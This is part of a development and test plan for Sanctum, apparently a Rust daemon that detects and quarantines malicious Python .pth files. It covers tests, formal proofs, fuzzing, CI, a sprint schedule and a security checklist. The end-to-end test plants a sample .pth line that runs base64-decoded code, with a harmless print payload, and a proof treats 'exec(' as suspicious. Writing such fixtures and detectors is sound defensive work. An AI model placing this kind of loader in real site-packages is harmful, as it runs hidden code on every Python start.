    Command::cargo_bin("sanctum")
        .unwrap()
        .args(["init", "--dir", dir.path().to_str().unwrap()])
        .assert()
        .success()
        .stdout(predicates::str::contains("already exists"));
    
    // Original config preserved
    let content = fs::read_to_string(&config_path).unwrap();
    assert!(content.contains("watch_pth = false"));
}

#[test]
fn cli_status_when_daemon_not_running() {
    Command::cargo_bin("sanctum")
        .unwrap()
        .args(["status"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("daemon is not running"));
}

#[test]
fn cli_review_with_no_quarantined_items() {
    // With daemon running but no quarantined items
    Command::cargo_bin("sanctum")
        .unwrap()
        .args(["review"])
        .assert()
        .success()
        .stdout(predicates::str::contains("No items to review"));
}

// tests/shell_hooks.rs

#[test]
fn shell_hook_zsh_is_valid_syntax() {
    let hook = generate_shell_hook(Shell::Zsh);
    // Write to file and check with zsh -n (syntax check)
    let dir = tempdir().unwrap();
    let path = dir.path().join("hook.zsh");
    fs::write(&path, &hook).unwrap();
    
    if which::which("zsh").is_ok() {
        Command::new("zsh")
            .args(["-n", path.to_str().unwrap()])
            .assert()
            .success();
    }
}

#[test]
fn shell_hook_bash_is_valid_syntax() {
    let hook = generate_shell_hook(Shell::Bash);
    let dir = tempdir().unwrap();
    let path = dir.path().join("hook.bash");
    fs::write(&path, &hook).unwrap();
    
    if which::which("bash").is_ok() {
        Command::new("bash")
            .args(["-n", path.to_str().unwrap()])
            .assert()
            .success();
    }
}

#[test]
fn shell_hook_contains_daemon_auto_start() {
    let hook = generate_shell_hook(Shell::Zsh);
    assert!(hook.contains("sanctum daemon start"));
}

#[test]
fn shell_hook_contains_prompt_integration() {
    let hook = generate_shell_hook(Shell::Zsh);
    // Should set SANCTUM_ACTIVE for prompt integrations (starship, etc.)
    assert!(hook.contains("SANCTUM_ACTIVE"));
}
```

### 4.8 End-to-end tests (week 5, days 1-3)

```rust
// tests/e2e_pth_detection.rs

/// Full attack simulation: install a malicious package and verify
/// Sanctum detects, quarantines, and reports correctly.
#[tokio::test]
async fn e2e_full_attack_simulation() {
    let env = TestEnvironment::new().await;
    
    // Start Sanctum daemon watching the test site-packages
    env.start_daemon().await;
    
    // Simulate pip installing a package that drops a malicious .pth
    let pth_content = r#"import base64;exec(base64.b64decode("cHJpbnQoJ3B3bmVkJyk="))"#;
    env.create_file("site-packages/evil_init.pth", pth_content).await;
    
    // Wait for detection (should be < 1 second)
    let event = env.wait_for_event(Duration::from_secs(2)).await
        .expect("should have detected the .pth file");
    
    // Verify threat assessment
    assert_eq!(event.level, ThreatLevel::Critical);
    assert!(event.description.contains("base64"));
    assert_eq!(event.action_taken, Action::Quarantined);
    
    // Verify quarantine
    let original = env.path("site-packages/evil_init.pth");
    assert_eq!(fs::read_to_string(&original).unwrap(), "");
    
    // Verify CLI can list quarantined items
    let output = env.run_cli(["review", "--json"]).await;
    let items: Vec<QuarantineEntry> = serde_json::from_str(&output.stdout).unwrap();
    assert_eq!(items.len(), 1);
    assert!(items[0].reason.contains("base64"));
    
    // Verify audit log was written
    let log = env.read_audit_log().await;
    assert!(log.contains("PthInjection"));
    assert!(log.contains("Quarantined"));
    
    env.stop_daemon().await;
}

#[tokio::test]
async fn e2e_benign_pip_install_not_flagged() {
    let env = TestEnvironment::new().await;
    env.start_daemon().await;
    
    // Simulate pip creating a normal path-only .pth file
    env.create_file(
        "site-packages/normal.pth",
        "/usr/lib/python3.12/dist-packages/normal_package\n",
    ).await;
    
    // Give the watcher time to process
    tokio::time::sleep(Duration::from_millis(500)).await;
    
    // Should not be quarantined
    let content = fs::read_to_string(env.path("site-packages/normal.pth")).unwrap();
    assert!(content.contains("normal_package"));
    
    // No quarantine entries
    let output = env.run_cli(["review", "--json"]).await;
    let items: Vec<QuarantineEntry> = serde_json::from_str(&output.stdout).unwrap();
    assert_eq!(items.len(), 0);
    
    env.stop_daemon().await;
}
```

---

## 5. Formal verification strategy

### 5.1 Kani bounded model checking (for security-critical functions)

Kani is a Rust model checker backed by CBMC. It exhaustively explores all possible inputs within specified bounds, proving properties hold for every case — not just the test cases we thought of.

```rust
// proofs/kani/pth_analyser.rs

#[cfg(kani)]
mod proofs {
    use super::*;

    /// Prove: analyse_pth_line never panics on any input.
    #[kani::proof]
    #[kani::unwind(256)]  // Max line length for bounded proof
    fn pth_analyser_never_panics() {
        let len: usize = kani::any();
        kani::assume(len <= 256);
        let bytes: Vec<u8> = (0..len).map(|_| kani::any()).collect();
        if let Ok(line) = std::str::from_utf8(&bytes) {
            let _ = analyse_pth_line(line);
            // If we reach here, no panic occurred
        }
    }

    /// Prove: a line containing ONLY path characters is always Benign.
    #[kani::proof]
    #[kani::unwind(128)]
    fn pure_path_is_always_benign() {
        let len: usize = kani::any();
        kani::assume(len > 0 && len <= 128);
        
        // Generate a string of only path-safe characters
        let path_chars = b"abcdefghijklmnopqrstuvwxyz0123456789/._-";
        let bytes: Vec<u8> = (0..len).map(|_| {
            let idx: usize = kani::any();
            kani::assume(idx < path_chars.len());
            path_chars[idx]
        }).collect();
        
        let line = std::str::from_utf8(&bytes).unwrap();
        let result = analyse_pth_line(line);
        assert_eq!(result, PthVerdict::Benign);
    }

    /// Prove: any line containing "exec(" is at least Warning level.
    #[kani::proof]
    #[kani::unwind(64)]
    fn exec_is_never_benign() {
        let prefix_len: usize = kani::any();
        let suffix_len: usize = kani::any();
        kani::assume(prefix_len <= 32);
        kani::assume(suffix_len <= 32);
        
        let prefix: String = (0..prefix_len)
            .map(|_| { let c: u8 = kani::any(); kani::assume(c.is_ascii()); c as char })
            .collect();
        let suffix: String = (0..suffix_len)
            .map(|_| { let c: u8 = kani::any(); kani::assume(c.is_ascii()); c as char })
            .collect();
        
        let line = format!("{prefix}exec({suffix}");
        let result = analyse_pth_line(&line);
        assert!(result.level() >= ThreatLevel::Warning);
    }

    /// Prove: quarantine state machine transitions are valid.
    #[kani::proof]
    fn quarantine_state_transitions() {
        let initial = QuarantineState::Active;
        let action: QuarantineAction = kani::any();
        
        let next = initial.apply(action);
        
        match action {
            QuarantineAction::Approve => assert_eq!(next, QuarantineState::Restored),
            QuarantineAction::Delete => assert_eq!(next, QuarantineState::Deleted),
            QuarantineAction::Report => assert_eq!(next, QuarantineState::Active),
        }
        
        // Deleted state is terminal
        if next == QuarantineState::Deleted {
            // No further transitions allowed
            let any_action: QuarantineAction = kani::any();
            assert!(QuarantineState::Deleted.apply(any_action).is_err());
        }
    }
}
```

### 5.2 Property-based testing with proptest

For properties that are too expensive for Kani's bounded model checking, use proptest with thousands of random inputs.

```rust
// tests/property_tests.rs

use proptest::prelude::*;

proptest! {
    /// Property: analyse_pth_line is a total function (never panics)
    #[test]
    fn pth_analyser_total(line in ".*") {
        let _ = analyse_pth_line(&line);
    }

    /// Property: analyse_pth_line is deterministic
    #[test]
    fn pth_analyser_deterministic(line in ".*") {
        let r1 = analyse_pth_line(&line);
        let r2 = analyse_pth_line(&line);
        prop_assert_eq!(r1, r2);
    }

    /// Property: analyse_pth_file severity is max of line severities
    #[test]
    fn file_severity_is_max_of_lines(lines in prop::collection::vec(".*", 1..20)) {
        let content = lines.join("\n");
        let file_result = analyse_pth_file(&content);
        
        let max_line_level = lines.iter()
            .map(|l| analyse_pth_line(l).level())
            .max()
            .unwrap();
        
        prop_assert_eq!(file_result.verdict.level(), max_line_level);
    }

    /// Property: quarantine + restore is identity
    #[test]
    fn quarantine_restore_roundtrip(content in "[a-zA-Z0-9/._\\-\n]{1,1000}") {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.pth");
        std::fs::write(&path, &content).unwrap();
        
        let q = Quarantine::new(dir.path().join("quarantine"));
        let entry = q.quarantine_file(&path, &default_meta()).unwrap();
        q.restore(&entry.id).unwrap();
        
        prop_assert_eq!(std::fs::read_to_string(&path).unwrap(), content);
    }

    /// Property: SHA-256 hashes are consistent
    #[test]
    fn content_hash_is_deterministic(content in prop::collection::vec(any::<u8>(), 0..10000)) {
        let h1 = content_hash(&content);
        let h2 = content_hash(&content);
        prop_assert_eq!(h1, h2);
    }
}
```

### 5.3 Fuzz testing with cargo-fuzz

Fuzz targets run continuously in CI, finding edge cases that neither human-written tests nor property-based tests cover.

```rust
// fuzz/fuzz_targets/fuzz_pth_analyser.rs

#![no_main]
use libfuzzer_sys::fuzz_target;
use sanctum_sentinel::pth::analyser::analyse_pth_line;

fuzz_target!(|data: &[u8]| {
    if let Ok(line) = std::str::from_utf8(data) {
        // Must never panic, regardless of input
        let _ = analyse_pth_line(line);
    }
});

// fuzz/fuzz_targets/fuzz_config_parser.rs

#![no_main]
use libfuzzer_sys::fuzz_target;
use sanctum_types::config::SanctumConfig;

fuzz_target!(|data: &[u8]| {
    if let Ok(toml_str) = std::str::from_utf8(data) {
        // Must never panic on any input, even malformed TOML
        let _ = toml::from_str::<SanctumConfig>(toml_str);
    }
});
```

---

## 6. CI/CD pipeline

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always
  RUSTFLAGS: "-D warnings"

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@1.82.0
        with:
          components: rustfmt, clippy
      - run: cargo fmt --all -- --check
      - run: cargo clippy --all-targets --all-features

  deny:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: EmbarkStudios/cargo-deny-action@v2

  test-linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@1.82.0
      - run: cargo test --all --all-features
      - run: cargo test --all --all-features -- --ignored  # slow tests

  test-macos:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@1.82.0
      - run: cargo test --all --all-features

  property-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@1.82.0
      - run: cargo test --all --all-features -- property
        env:
          PROPTEST_CASES: 10000  # 10x default

  kani:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: model-checking/kani-github-action@v1
      - run: cargo kani --workspace

  fuzz:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@nightly  # fuzz requires nightly
      - run: cargo install cargo-fuzz
      - run: cargo fuzz run fuzz_pth_analyser -- -max_total_time=300
      - run: cargo fuzz run fuzz_config_parser -- -max_total_time=300

  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: rustsec/audit-check@v2
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

  build-release:
    needs: [lint, deny, test-linux, test-macos, property-tests, kani, audit]
    strategy:
      matrix:
        include:
          - target: x86_64-unknown-linux-gnu
            os: ubuntu-latest
          - target: aarch64-unknown-linux-gnu
            os: ubuntu-latest
          - target: x86_64-apple-darwin
            os: macos-latest
          - target: aarch64-apple-darwin
            os: macos-latest
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@1.82.0
        with:
          targets: ${{ matrix.target }}
      - run: cargo build --release --target ${{ matrix.target }}
      - uses: actions/upload-artifact@v4
        with:
          name: sanctum-${{ matrix.target }}
          path: target/${{ matrix.target }}/release/sanctum

  sign:
    needs: [build-release]
    runs-on: ubuntu-latest
    permissions:
      id-token: write  # Required for Sigstore OIDC
    steps:
      - uses: sigstore/cosign-installer@v3
      - uses: actions/download-artifact@v4
      - run: |
          for binary in sanctum-*/sanctum; do
            cosign sign-blob --yes "$binary" \
              --output-signature "${binary}.sig" \
              --output-certificate "${binary}.cert"
          done
```

---

## 7. Sprint schedule

### Week 1: Foundation (types + .pth analyser)

| Day | RED (write failing test) | GREEN (make it pass) |
|---|---|---|
| Mon | ThreatLevel ordering, ThreatEvent serialisation | `sanctum-types` crate: enums, structs, serde derives |
| Tue | Config deserialisation (valid + invalid cases) | Config types with validation, custom deserialiser for budget strings |
| Wed | Benign .pth cases (8 tests) | `analyse_pth_line` — path detection logic |
| Thu | Warning cases (3 tests) + Critical cases (7 tests) | Executable code detection, keyword scanning |
| Fri | Evasion resistance (4 tests) + whole-file analysis | Unicode normalisation, null-byte handling, file aggregation |

**End of week 1 gate:** All 22+ .pth analyser tests pass. `cargo clippy` clean. `cargo deny` clean.

### Week 2: Process lineage + quarantine

| Day | RED | GREEN |
|---|---|---|
| Mon | Process lineage: pip ancestor, poetry ancestor | `/proc` parsing, process tree traversal with MockProcFs |
| Tue | Lineage: Python startup detection, exited process, circular refs | Depth-limited traversal, error handling for missing processes |
| Wed | Quarantine: move, idempotent, permissions | Quarantine module: file operations, metadata serialisation |
| Thu | Quarantine: restore, delete, list, read-only dir | State machine implementation, error paths |
| Fri | Property tests + Kani proofs | proptest harnesses, Kani proof harnesses for analyser + quarantine |

**End of week 2 gate:** Process lineage + quarantine fully tested. Kani proofs pass. proptest with 10,000 cases passes.

### Week 3: Filesystem watcher + daemon

| Day | RED | GREEN |
|---|---|---|
| Mon | Watcher: detects new .pth, ignores non-.pth | `notify` crate integration, file extension filtering |
| Tue | Watcher: sitecustomize, survives dir deletion, auto-discovery | Watch path management, Python site-packages discovery |
| Wed | Integration: watcher → analyser → quarantine pipeline | Event processing loop, connecting the three modules |
| Thu | Daemon: PID file, already running, stale PID, SIGTERM | Daemon lifecycle management, signal handling |
| Fri | Daemon: IPC server (Unix socket), status command | `tokio::net::UnixListener`, IPC protocol, message framing |

**End of week 3 gate:** Daemon starts, watches, detects, quarantines, and responds to IPC queries. Full pipeline working.

### Week 4: CLI + notifications + integration

| Day | RED | GREEN |
|---|---|---|
| Mon | IPC: message size limits, socket permissions | Security hardening of IPC layer |
| Tue | CLI: init, status, review commands | `clap` argument parsing, IPC client, formatted output |
| Wed | CLI: scan command (find .env files with plaintext secrets) | Credential pattern scanner for project files |
| Thu | Shell hooks: zsh, bash, fish syntax validity | Shell hook generation, auto-start logic |
| Fri | Desktop notifications: macOS, Linux | `notify-rust` integration, notification formatting |

**End of week 4 gate:** Full CLI works. Shell hooks install correctly. Notifications fire.

### Week 5: E2E testing, fuzzing, hardening

| Day | RED | GREEN |
|---|---|---|
| Mon | E2E: full attack simulation, benign install not flagged | Test environment harness, fixture management |
| Tue | E2E: daemon restart recovery, config reload | Resilience testing, state persistence |
| Wed | Fuzz targets: .pth analyser, config parser (5hr runs) | Fix any crashes found by fuzzer |
| Thu | Security review: threat model doc, SECURITY.md | Documentation, vulnerability reporting process |
| Fri | Performance benchmarks: watcher latency, IPC round-trip | `criterion` benchmarks, latency budget verification |

**End of week 5 gate:** All E2E tests pass. No fuzzer crashes after 5 hours. Performance within budget (< 100ms detection latency).

### Week 6: Release engineering

| Day | RED | GREEN |
|---|---|---|
| Mon | CI pipeline: all jobs pass on Linux + macOS | GitHub Actions workflow, cross-compilation |
| Tue | Release binaries: Sigstore signing, Homebrew formula | Cosign signing, Homebrew tap setup |
| Wed | Install script, README, docs site | `install.sh`, documentation |
| Thu | Starship integration, `sanctum run` wrapper | Prompt segment, command wrapping |
| Fri | Launch prep: blog post draft, HN submission, changelog | `git-cliff` changelog, v0.1.0 tag |

**End of week 6 gate:** v0.1.0 shipped. Homebrew installable. Sigstore-attested binaries. Documentation live. Blog post ready.

---

## 8. Security standards checklist

Every item must be satisfied before v0.1.0 release:

### Code quality

- [ ] `cargo clippy --all-targets` with `unwrap_used = deny` passes
- [ ] `cargo fmt --check` passes
- [ ] `cargo deny check` passes (license, advisory, ban checks)
- [ ] `cargo audit` reports zero vulnerabilities
- [ ] Zero `unsafe` blocks in the entire codebase (or each justified + documented in ARCHITECTURE.md)
- [ ] All error paths return `Result`, no panics on any input

### Testing

- [ ] Unit test coverage > 90% on security-critical modules (analyser, quarantine, lineage)
- [ ] Property-based tests with 10,000+ cases pass
- [ ] Kani bounded model checking proofs pass for analyser + quarantine state machine
- [ ] Fuzz testing: 5+ hours with zero crashes on each target
- [ ] E2E tests cover full attack simulation + benign case
- [ ] Tests pass on both Linux (x86_64) and macOS (aarch64)

### Supply chain

- [ ] All direct dependencies listed in DEPENDENCY_AUDIT.md with justification
- [ ] Cargo.lock committed
- [ ] `cargo-deny` blocks undeclared licenses and banned crates
- [ ] Release binaries signed with Sigstore (cosign)
- [ ] Reproducible builds verified (two independent builds produce identical hashes)
- [ ] Rust toolchain version pinned in `rust-toolchain.toml`

### Runtime security

- [ ] No secrets (API keys, tokens) ever stored in daemon memory without `secrecy::SecretString`
- [ ] PID file and Unix socket have owner-only permissions (0o600/0o700)
- [ ] IPC messages capped at 64KB (DoS resistance)
- [ ] Daemon runs as unprivileged user (no root required)
- [ ] SIGTERM/SIGHUP handlers clean up all resources
- [ ] No network connections made by the daemon in Phase 1 (pure local monitoring)

### Documentation

- [ ] SECURITY.md with vulnerability reporting process (security@sanctum.dev or GitHub private advisory)
- [ ] THREAT_MODEL.md documents what Sanctum does and does not protect against
- [ ] ARCHITECTURE.md documents all design decisions with rationale
- [ ] DEPENDENCY_AUDIT.md justifies every direct dependency
- [ ] README.md with installation, quickstart, and configuration guide

---

## 9. Metrics and acceptance criteria

### Performance budget

| Metric | Target | Measurement |
|---|---|---|
| .pth detection latency (file create → alert) | < 100ms | E2E test with timestamp comparison |
| IPC round-trip (status query) | < 5ms | `criterion` benchmark |
| Daemon memory footprint (idle) | < 10MB RSS | `ps` measurement in CI |
| Daemon CPU usage (idle, watching) | < 0.1% | `top` measurement over 60s |
| Binary size (stripped, release) | < 5MB | CI artifact size check |
| Cold start time (daemon launch) | < 200ms | CLI timing measurement |

### Quality metrics

| Metric | Target |
|---|---|
| Test count (total) | > 100 |
| Test count (security-critical modules) | > 60 |
| Clippy lint warnings | 0 |
| `unsafe` blocks | 0 (or individually justified) |
| Kani proof harnesses | > 4 |
| Fuzz crash count (after 5hr run) | 0 |
| proptest regression count | 0 |
